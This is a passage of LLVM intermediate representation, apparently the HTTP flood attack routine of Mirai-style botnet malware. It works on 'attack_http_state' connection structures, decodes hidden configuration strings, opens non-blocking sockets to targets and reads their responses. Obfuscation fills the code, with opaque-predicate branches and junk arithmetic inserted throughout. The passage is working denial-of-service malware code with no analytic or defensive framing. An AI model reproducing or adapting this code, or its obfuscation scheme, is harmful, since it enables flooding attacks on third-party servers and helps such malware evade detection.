  %3943 = sub i32 %3941, 1
  %3944 = mul i32 %3941, %3943
  %3945 = urem i32 %3944, 2
  %3946 = icmp eq i32 %3945, 0
  %3947 = icmp slt i32 %3942, 10
  %3948 = or i1 %3946, %3947
  br i1 %3948, label %originalBB661, label %originalBB661alteredBB

originalBB661:                                    ; preds = %originalBB661alteredBB, %3940
  %3949 = load i32, i32* @x.19
  %3950 = load i32, i32* @y.20
  %3951 = sub i32 %3949, 1
  %3952 = mul i32 %3949, %3951
  %3953 = urem i32 %3952, 2
  %3954 = icmp eq i32 %3953, 0
  %3955 = icmp slt i32 %3950, 10
  %3956 = or i1 %3954, %3955
  br i1 %3956, label %originalBBpart2663, label %originalBB661alteredBB

originalBBpart2663:                               ; preds = %originalBB661
  br label %3957

; <label>:3957:                                   ; preds = %originalBBpart2663, %3810
  %3958 = load i32, i32* %59, align 4
  %3959 = icmp eq i32 %3958, 0
  br i1 %3959, label %3960, label %3961

; <label>:3960:                                   ; preds = %3957
  br label %4010

; <label>:3961:                                   ; preds = %3957
  %3962 = load i32, i32* %59, align 4
  %3963 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3964 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3963, i32 0, i32 17
  %3965 = load i32, i32* %3964, align 4
  %3966 = sub nsw i32 %3965, %3962
  store i32 %3966, i32* %3964, align 4
  %3967 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3968 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3967, i32 0, i32 18
  %3969 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3968, i32 0, i32 0
  %3970 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3971 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3970, i32 0, i32 18
  %3972 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3971, i32 0, i32 0
  %3973 = load i32, i32* %59, align 4
  %3974 = sext i32 %3973 to i64
  %3975 = getelementptr inbounds i8, i8* %3972, i64 %3974
  %3976 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3977 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3976, i32 0, i32 17
  %3978 = load i32, i32* %3977, align 4
  %3979 = sext i32 %3978 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %3969, i8* %3975, i64 %3979, i32 1, i1 false)
  %3980 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3981 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3980, i32 0, i32 18
  %3982 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3983 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3982, i32 0, i32 17
  %3984 = load i32, i32* %3983, align 4
  %3985 = sext i32 %3984 to i64
  %3986 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3981, i64 0, i64 %3985
  store i8 0, i8* %3986, align 1
  %3987 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3988 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3987, i32 0, i32 17
  %3989 = load i32, i32* %3988, align 4
  %3990 = icmp eq i32 %3989, 0
  br i1 %3990, label %3991, label %3992

; <label>:3991:                                   ; preds = %3961
  br label %4010

; <label>:3992:                                   ; preds = %3961
  br label %3993

; <label>:3993:                                   ; preds = %3992
  %3994 = load i32, i32* @x.19
  %3995 = load i32, i32* @y.20
  %3996 = sub i32 %3994, 1
  %3997 = mul i32 %3994, %3996
  %3998 = urem i32 %3997, 2
  %3999 = icmp eq i32 %3998, 0
  %4000 = icmp slt i32 %3995, 10
  %4001 = or i1 %3999, %4000
  br i1 %4001, label %originalBB665, label %originalBB665alteredBB

originalBB665:                                    ; preds = %originalBB665alteredBB, %3993
  %4002 = load i32, i32* @x.19
  %4003 = load i32, i32* @y.20
  %4004 = sub i32 %4002, 1
  %4005 = mul i32 %4002, %4004
  %4006 = urem i32 %4005, 2
  %4007 = icmp eq i32 %4006, 0
  %4008 = icmp slt i32 %4003, 10
  %4009 = or i1 %4007, %4008
  br i1 %4009, label %originalBBpart2667, label %originalBB665alteredBB

originalBBpart2667:                               ; preds = %originalBB665
  br label %3586

; <label>:4010:                                   ; preds = %3991, %3960, %3936, %3882, %3787
  %4011 = load i32, i32* @x.19
  %4012 = load i32, i32* @y.20
  %4013 = sub i32 %4011, 1
  %4014 = mul i32 %4011, %4013
  %4015 = urem i32 %4014, 2
  %4016 = icmp eq i32 %4015, 0
  %4017 = icmp slt i32 %4012, 10
  %4018 = or i1 %4016, %4017
  br i1 %4018, label %originalBB669, label %originalBB669alteredBB

originalBB669:                                    ; preds = %originalBB669alteredBB, %4010
  %4019 = load i32, i32* @x.19
  %4020 = load i32, i32* @y.20
  %4021 = sub i32 %4019, 1
  %4022 = mul i32 %4019, %4021
  %4023 = urem i32 %4022, 2
  %4024 = icmp eq i32 %4023, 0
  %4025 = icmp slt i32 %4020, 10
  %4026 = or i1 %4024, %4025
  br i1 %4026, label %originalBBpart2671, label %originalBB669alteredBB

originalBBpart2671:                               ; preds = %originalBB669
  br label %3492

; <label>:4027:                                   ; preds = %3576, %3498
  br label %4144

; <label>:4028:                                   ; preds = %originalBBpart2598
  %4029 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4030 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4029, i32 0, i32 1
  %4031 = load i8, i8* %4030, align 4
  %4032 = zext i8 %4031 to i32
  %4033 = icmp eq i32 %4032, 10
  br i1 %4033, label %4034, label %4143

; <label>:4034:                                   ; preds = %4028
  br label %4035

; <label>:4035:                                   ; preds = %originalBBpart2679, %4034
  %4036 = call i32* @__errno_location() #7
  store i32 0, i32* %4036, align 4
  %4037 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4038 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4037, i32 0, i32 0
  %4039 = load i32, i32* %4038, align 4
  %4040 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4041 = call i64 @recv(i32 %4039, i8* %4040, i64 10240, i32 16384)
  %4042 = trunc i64 %4041 to i32
  store i32 %4042, i32* %12, align 4
  %4043 = load i32, i32* %12, align 4
  %4044 = icmp eq i32 %4043, 0
  br i1 %4044, label %4045, label %4047

; <label>:4045:                                   ; preds = %4035
  %4046 = call i32* @__errno_location() #7
  store i32 104, i32* %4046, align 4
  store i32 -1, i32* %12, align 4
  br label %4047

; <label>:4047:                                   ; preds = %4045, %4035
  %4048 = load i32, i32* @x.19
  %4049 = load i32, i32* @y.20
  %4050 = sub i32 %4048, 1
  %4051 = mul i32 %4048, %4050
  %4052 = urem i32 %4051, 2
  %4053 = icmp eq i32 %4052, 0
  %4054 = icmp slt i32 %4049, 10
  %4055 = or i1 %4053, %4054
  br i1 %4055, label %originalBB673, label %originalBB673alteredBB

originalBB673:                                    ; preds = %originalBB673alteredBB, %4047
  %4056 = load i32, i32* %12, align 4
  %4057 = icmp eq i32 %4056, -1
  %4058 = load i32, i32* @x.19
  %4059 = load i32, i32* @y.20
  %4060 = sub i32 %4058, 1
  %4061 = mul i32 %4058, %4060
  %4062 = urem i32 %4061, 2
  %4063 = icmp eq i32 %4062, 0
  %4064 = icmp slt i32 %4059, 10
  %4065 = or i1 %4063, %4064
  br i1 %4065, label %originalBBpart2675, label %originalBB673alteredBB

originalBBpart2675:                               ; preds = %originalBB673
  br i1 %4057, label %4066, label %4084

; <label>:4066:                                   ; preds = %originalBBpart2675
  %4067 = call i32* @__errno_location() #7
  %4068 = load i32, i32* %4067, align 4
  %4069 = icmp ne i32 %4068, 11
  br i1 %4069, label %4070, label %4083

; <label>:4070:                                   ; preds = %4066
  %4071 = call i32* @__errno_location() #7
  %4072 = load i32, i32* %4071, align 4
  %4073 = icmp ne i32 %4072, 11
  br i1 %4073, label %4074, label %4083

; <label>:4074:                                   ; preds = %4070
  %4075 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4076 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4075, i32 0, i32 0
  %4077 = load i32, i32* %4076, align 4
  %4078 = call i32 @close(i32 %4077)
  %4079 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4080 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4079, i32 0, i32 0
  store i32 -1, i32* %4080, align 4
  %4081 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4082 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4081, i32 0, i32 1
  store i8 0, i8* %4082, align 4
  br label %4083

; <label>:4083:                                   ; preds = %4074, %4070, %4066
  br label %4101

; <label>:4084:                                   ; preds = %originalBBpart2675
  %4085 = load i32, i32* @x.19
  %4086 = load i32, i32* @y.20
  %4087 = sub i32 %4085, 1
  %4088 = mul i32 %4085, %4087
  %4089 = urem i32 %4088, 2
  %4090 = icmp eq i32 %4089, 0
  %4091 = icmp slt i32 %4086, 10
  %4092 = or i1 %4090, %4091
  br i1 %4092, label %originalBB677, label %originalBB677alteredBB

originalBB677:                                    ; preds = %originalBB677alteredBB, %4084
  %4093 = load i32, i32* @x.19
  %4094 = load i32, i32* @y.20
  %4095 = sub i32 %4093, 1
  %4096 = mul i32 %4093, %4095
  %4097 = urem i32 %4096, 2
  %4098 = icmp eq i32 %4097, 0
  %4099 = icmp slt i32 %4094, 10
  %4100 = or i1 %4098, %4099
  br i1 %4100, label %originalBBpart2679, label %originalBB677alteredBB

originalBBpart2679:                               ; preds = %originalBB677
  br label %4035

; <label>:4101:                                   ; preds = %4083
  %4102 = load i32, i32* @x.19
  %4103 = load i32, i32* @y.20
  %4104 = sub i32 %4102, 1
  %4105 = mul i32 %4102, %4104
  %4106 = urem i32 %4105, 2
  %4107 = icmp eq i32 %4106, 0
  %4108 = icmp slt i32 %4103, 10
  %4109 = or i1 %4107, %4108
  br i1 %4109, label %originalBB681, label %originalBB681alteredBB

originalBB681:                                    ; preds = %originalBB681alteredBB, %4101
  %4110 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4111 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4110, i32 0, i32 1
  %4112 = load i8, i8* %4111, align 4
  %4113 = zext i8 %4112 to i32
  %4114 = icmp ne i32 %4113, 0
  %4115 = load i32, i32* @x.19
  %4116 = load i32, i32* @y.20
  %4117 = sub i32 %4115, 1
  %4118 = mul i32 %4115, %4117
  %4119 = urem i32 %4118, 2
  %4120 = icmp eq i32 %4119, 0
  %4121 = icmp slt i32 %4116, 10
  %4122 = or i1 %4120, %4121
  br i1 %4122, label %originalBBpart2683, label %originalBB681alteredBB

originalBBpart2683:                               ; preds = %originalBB681
  br i1 %4114, label %4123, label %4142

; <label>:4123:                                   ; preds = %originalBBpart2683
  %4124 = load i32, i32* @x.19
  %4125 = load i32, i32* @y.20
  %4126 = sub i32 %4124, 1
  %4127 = mul i32 %4124, %4126
  %4128 = urem i32 %4127, 2
  %4129 = icmp eq i32 %4128, 0
  %4130 = icmp slt i32 %4125, 10
  %4131 = or i1 %4129, %4130
  br i1 %4131, label %originalBB685, label %originalBB685alteredBB

originalBB685:                                    ; preds = %originalBB685alteredBB, %4123
  %4132 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4133 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4132, i32 0, i32 1
  store i8 1, i8* %4133, align 4
  %4134 = load i32, i32* @x.19
  %4135 = load i32, i32* @y.20
  %4136 = sub i32 %4134, 1
  %4137 = mul i32 %4134, %4136
  %4138 = urem i32 %4137, 2
  %4139 = icmp eq i32 %4138, 0
  %4140 = icmp slt i32 %4135, 10
  %4141 = or i1 %4139, %4140
  br i1 %4141, label %originalBBpart2687, label %originalBB685alteredBB

originalBBpart2687:                               ; preds = %originalBB685
  br label %4142

; <label>:4142:                                   ; preds = %originalBBpart2687, %originalBBpart2683
  br label %4143

; <label>:4143:                                   ; preds = %4142, %4028
  br label %4144

; <label>:4144:                                   ; preds = %4143, %4027
  br label %4145

; <label>:4145:                                   ; preds = %4144, %3460
  %4146 = load i32, i32* @x.19
  %4147 = load i32, i32* @y.20
  %4148 = sub i32 %4146, 1
  %4149 = mul i32 %4146, %4148
  %4150 = urem i32 %4149, 2
  %4151 = icmp eq i32 %4150, 0
  %4152 = icmp slt i32 %4147, 10
  %4153 = or i1 %4151, %4152
  br i1 %4153, label %originalBB689, label %originalBB689alteredBB

originalBB689:                                    ; preds = %originalBB689alteredBB, %4145
  %4154 = load i32, i32* @x.19
  %4155 = load i32, i32* @y.20
  %4156 = sub i32 %4154, 1
  %4157 = mul i32 %4154, %4156
  %4158 = urem i32 %4157, 2
  %4159 = icmp eq i32 %4158, 0
  %4160 = icmp slt i32 %4155, 10
  %4161 = or i1 %4159, %4160
  br i1 %4161, label %originalBBpart2691, label %originalBB689alteredBB

originalBBpart2691:                               ; preds = %originalBB689
  br label %4162

; <label>:4162:                                   ; preds = %originalBBpart2691, %originalBBpart2268
  %4163 = load i32, i32* @x.19
  %4164 = load i32, i32* @y.20
  %4165 = sub i32 %4163, 1
  %4166 = mul i32 %4163, %4165
  %4167 = urem i32 %4166, 2
  %4168 = icmp eq i32 %4167, 0
  %4169 = icmp slt i32 %4164, 10
  %4170 = or i1 %4168, %4169
  br i1 %4170, label %originalBB693, label %originalBB693alteredBB

originalBB693:                                    ; preds = %originalBB693alteredBB, %4162
  %4171 = load i32, i32* @x.19
  %4172 = load i32, i32* @y.20
  %4173 = sub i32 %4171, 1
  %4174 = mul i32 %4171, %4173
  %4175 = urem i32 %4174, 2
  %4176 = icmp eq i32 %4175, 0
  %4177 = icmp slt i32 %4172, 10
  %4178 = or i1 %4176, %4177
  br i1 %4178, label %originalBBpart2695, label %originalBB693alteredBB

originalBBpart2695:                               ; preds = %originalBB693
  br label %4179

; <label>:4179:                                   ; preds = %originalBBpart2695, %3388, %2705, %1748, %1715, %1657, %1609
  %4180 = load i32, i32* %9, align 4
  %4181 = add nsw i32 %4180, 1
  store i32 %4181, i32* %9, align 4
  br label %1596

; <label>:4182:                                   ; preds = %1596
  %4183 = load i32, i32* @x.19
  %4184 = load i32, i32* @y.20
  %4185 = sub i32 %4183, 1
  %4186 = mul i32 %4183, %4185
  %4187 = urem i32 %4186, 2
  %4188 = icmp eq i32 %4187, 0
  %4189 = icmp slt i32 %4184, 10
  %4190 = or i1 %4188, %4189
  br i1 %4190, label %originalBB697, label %originalBB697alteredBB

originalBB697:                                    ; preds = %originalBB697alteredBB, %4182
  %4191 = load i32, i32* @x.19
  %4192 = load i32, i32* @y.20
  %4193 = sub i32 %4191, 1
  %4194 = mul i32 %4191, %4193
  %4195 = urem i32 %4194, 2
  %4196 = icmp eq i32 %4195, 0
  %4197 = icmp slt i32 %4192, 10
  %4198 = or i1 %4196, %4197
  br i1 %4198, label %originalBBpart2699, label %originalBB697alteredBB

originalBBpart2699:                               ; preds = %originalBB697
  br label %664

; <label>:4199:                                   ; preds = %originalBBpart216, %originalBBpart212, %142, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %86
  %4200 = load i8*, i8** %17, align 8
  %4201 = icmp eq i8* %4200, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %105
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %122
  %4202 = load i8*, i8** %17, align 8
  %4203 = call i32 @util_strlen(i8* %4202)
  %4204 = icmp sgt i32 %4203, 255
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %147
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %168
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %186
  %4205 = load i32, i32* %10, align 4
  %4206 = load i8*, i8** %15, align 8
  %4207 = call i32 @util_strlen(i8* %4206)
  %4208 = icmp slt i32 %4205, %4207
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %207
  %4209 = load i8*, i8** %15, align 8
  %4210 = load i32, i32* %10, align 4
  %4211 = sext i32 %4210 to i64
  %4212 = getelementptr inbounds i8, i8* %4209, i64 %4211
  %4213 = load i8, i8* %4212, align 1
  %4214 = sext i8 %4213 to i32
  %4215 = icmp sge i32 %4214, 97
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %249
  %4216 = load i32, i32* %10, align 4
  %_ = sub i32 0, %4216
  %gen = add i32 %_, 1
  %_27 = sub i32 %4216, 1
  %gen28 = mul i32 %_27, 1
  %4217 = add nsw i32 %4216, 1
  store i32 %4217, i32* %10, align 4
  br label %originalBB26

originalBB33alteredBB:                            ; preds = %originalBB33, %268
  %4218 = load i32, i32* %18, align 4
  %4219 = icmp sgt i32 %4218, 500
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %463
  call void @table_unlock_val(i8 zeroext 75)
  %4220 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4221 = load i32, i32* %9, align 4
  %4222 = sext i32 %4221 to i64
  %4223 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4220, i64 %4222
  %4224 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4223, i32 0, i32 5
  %4225 = getelementptr inbounds [512 x i8], [512 x i8]* %4224, i32 0, i32 0
  %4226 = call i8* @table_retrieve_val(i32 75, i32* null)
  %4227 = call i32 @util_strcpy(i8* %4225, i8* %4226)
  call void @table_lock_val(i8 zeroext 75)
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %506
  call void @table_unlock_val(i8 zeroext 78)
  %4228 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4229 = load i32, i32* %9, align 4
  %4230 = sext i32 %4229 to i64
  %4231 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4228, i64 %4230
  %4232 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4231, i32 0, i32 5
  %4233 = getelementptr inbounds [512 x i8], [512 x i8]* %4232, i32 0, i32 0
  %4234 = call i8* @table_retrieve_val(i32 78, i32* null)
  %4235 = call i32 @util_strcpy(i8* %4233, i8* %4234)
  call void @table_lock_val(i8 zeroext 78)
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %531
  call void @table_unlock_val(i8 zeroext 79)
  %4236 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4237 = load i32, i32* %9, align 4
  %4238 = sext i32 %4237 to i64
  %4239 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4236, i64 %4238
  %4240 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4239, i32 0, i32 5
  %4241 = getelementptr inbounds [512 x i8], [512 x i8]* %4240, i32 0, i32 0
  %4242 = call i8* @table_retrieve_val(i32 79, i32* null)
  %4243 = call i32 @util_strcpy(i8* %4241, i8* %4242)
  call void @table_lock_val(i8 zeroext 79)
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %583
  call void @table_unlock_val(i8 zeroext 83)
  %4244 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4245 = load i32, i32* %9, align 4
  %4246 = sext i32 %4245 to i64
  %4247 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4244, i64 %4246
  %4248 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4247, i32 0, i32 5
  %4249 = getelementptr inbounds [512 x i8], [512 x i8]* %4248, i32 0, i32 0
  %4250 = call i8* @table_retrieve_val(i32 83, i32* null)
  %4251 = call i32 @util_strcpy(i8* %4249, i8* %4250)
  call void @table_lock_val(i8 zeroext 83)
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %647
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %691
  %4252 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4253 = load i32, i32* %9, align 4
  %4254 = sext i32 %4253 to i64
  %4255 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4252, i64 %4254
  store %struct.attack_http_state* %4255, %struct.attack_http_state** %26, align 8
  %4256 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4257 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4256, i32 0, i32 1
  %4258 = load i8, i8* %4257, align 4
  %4259 = zext i8 %4258 to i32
  %4260 = icmp eq i32 %4259, 1
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %735
  %4261 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %4261, i8 0, i64 16, i32 4, i1 false)
  %4262 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4263 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4262, i32 0, i32 0
  %4264 = load i32, i32* %4263, align 4
  %4265 = icmp ne i32 %4264, -1
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %762
  %4266 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %4267 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4268 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4267, i32 0, i32 0
  store i32 %4266, i32* %4268, align 4
  %4269 = icmp eq i32 %4266, -1
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %784
  %4270 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4271 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4270, i32 0, i32 0
  %4272 = load i32, i32* %4271, align 4
  %4273 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4274 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4273, i32 0, i32 0
  %4275 = load i32, i32* %4274, align 4
  %4276 = call i32 (i32, i32, ...) @fcntl(i32 %4275, i32 3, i32 0)
  %_70 = sub i32 0, 2048
  %gen71 = add i32 %_70, %4276
  %_72 = sub i32 2048, %4276
  %gen73 = mul i32 %_72, %4276
  %_74 = sub i32 0, 2048
  %gen75 = add i32 %_74, %4276
  %_76 = sub i32 0, 2048
  %gen77 = add i32 %_76, %4276
  %_78 = sub i32 2048, %4276
  %gen79 = mul i32 %_78, %4276
  %4277 = or i32 2048, %4276
  %4278 = call i32 (i32, i32, ...) @fcntl(i32 %4272, i32 4, i32 %4277)
  store i32 65535, i32* %10, align 4
  %4279 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4280 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4279, i32 0, i32 0
  %4281 = load i32, i32* %4280, align 4
  %4282 = bitcast i32* %10 to i8*
  %4283 = call i32 @setsockopt(i32 %4281, i32 0, i32 8, i8* %4282, i32 4) #6
  %4284 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %4284, align 4
  %4285 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4286 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4285, i32 0, i32 4
  %4287 = load i32, i32* %4286, align 4
  %4288 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %4289 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %4288, i32 0, i32 0
  store i32 %4287, i32* %4289, align 4
  %4290 = load i16, i16* %19, align 2
  %4291 = call zeroext i16 @htons(i16 zeroext %4290) #7
  %4292 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %4291, i16* %4292, align 2
  %4293 = load i32, i32* %27, align 4
  %4294 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4295 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4294, i32 0, i32 2
  store i32 %4293, i32* %4295, align 4
  %4296 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4297 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4296, i32 0, i32 1
  store i8 2, i8* %4297, align 4
  %4298 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4299 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4298, i32 0, i32 0
  %4300 = load i32, i32* %4299, align 4
  %4301 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %4302 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %4302, %struct.sockaddr** %4301, align 8
  %4303 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %4304 = load %struct.sockaddr*, %struct.sockaddr** %4303, align 8
  %4305 = call i32 @connect(i32 %4300, %struct.sockaddr* %4304, i32 16)
  %4306 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4307 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4306, i32 0, i32 0
  %4308 = load i32, i32* %4307, align 4
  %_80 = sub i32 0, %4308
  %gen81 = add i32 %_80, 64
  %4309 = srem i32 %4308, 64
  %4310 = zext i32 %4309 to i64
  %_82 = sub i64 1, %4310
  %gen83 = mul i64 %_82, %4310
  %_84 = sub i64 1, %4310
  %gen85 = mul i64 %_84, %4310
  %_86 = sub i64 0, 1
  %gen87 = add i64 %_86, %4310
  %4311 = shl i64 1, %4310
  %4312 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %4313 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4313, i32 0, i32 0
  %4315 = load i32, i32* %4314, align 4
  %_88 = sub i32 0, %4315
  %gen89 = add i32 %_88, 64
  %_90 = sub i32 0, %4315
  %gen91 = add i32 %_90, 64
  %_92 = sub i32 0, %4315
  %gen93 = add i32 %_92, 64
  %_94 = sub i32 0, %4315
  %gen95 = add i32 %_94, 64
  %4316 = sdiv i32 %4315, 64
  %4317 = sext i32 %4316 to i64
  %4318 = getelementptr inbounds [16 x i64], [16 x i64]* %4312, i64 0, i64 %4317
  %4319 = load i64, i64* %4318, align 8
  %_96 = sub i64 0, %4319
  %gen97 = add i64 %_96, %4311
  %4320 = or i64 %4319, %4311
  store i64 %4320, i64* %4318, align 8
  %4321 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4322 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4321, i32 0, i32 0
  %4323 = load i32, i32* %4322, align 4
  %4324 = load i32, i32* %23, align 4
  %4325 = icmp sgt i32 %4323, %4324
  br label %originalBB69

originalBB101alteredBB:                           ; preds = %originalBB101, %857
  %4326 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4327 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4326, i32 0, i32 0
  %4328 = load i32, i32* %4327, align 4
  %_102 = sub i32 0, %4328
  %gen103 = add i32 %_102, 1
  %_104 = sub i32 0, %4328
  %gen105 = add i32 %_104, 1
  %_106 = shl i32 %4328, 1
  %_107 = shl i32 %4328, 1
  %_108 = sub i32 %4328, 1
  %gen109 = mul i32 %_108, 1
  %4329 = add nsw i32 %4328, 1
  store i32 %4329, i32* %23, align 4
  br label %originalBB101

originalBB113alteredBB:                           ; preds = %originalBB113, %892
  %4330 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4331 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4330, i32 0, i32 1
  store i8 0, i8* %4331, align 4
  %4332 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4332, i32 0, i32 0
  %4334 = load i32, i32* %4333, align 4
  %4335 = call i32 @close(i32 %4334)
  %4336 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4337 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4336, i32 0, i32 0
  store i32 -1, i32* %4337, align 4
  br label %originalBB113

originalBB117alteredBB:                           ; preds = %originalBB117, %944
  %4338 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4339 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4338, i32 0, i32 1
  %4340 = load i8, i8* %4339, align 4
  %4341 = zext i8 %4340 to i32
  %4342 = icmp eq i32 %4341, 4
  br label %originalBB117

originalBB121alteredBB:                           ; preds = %originalBB121, %966
  %4343 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4344 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4343, i32 0, i32 14
  store i32 -1, i32* %4344, align 4
  %4345 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4346 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4345, i32 0, i32 11
  store i32 0, i32* %4346, align 4
  %4347 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4348 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4347, i32 0, i32 18
  %4349 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4348, i32 0, i32 0
  call void @util_zero(i8* %4349, i32 1024)
  %4350 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4350, i32 0, i32 17
  store i32 0, i32* %4351, align 4
  %4352 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %4352, i32 10240)
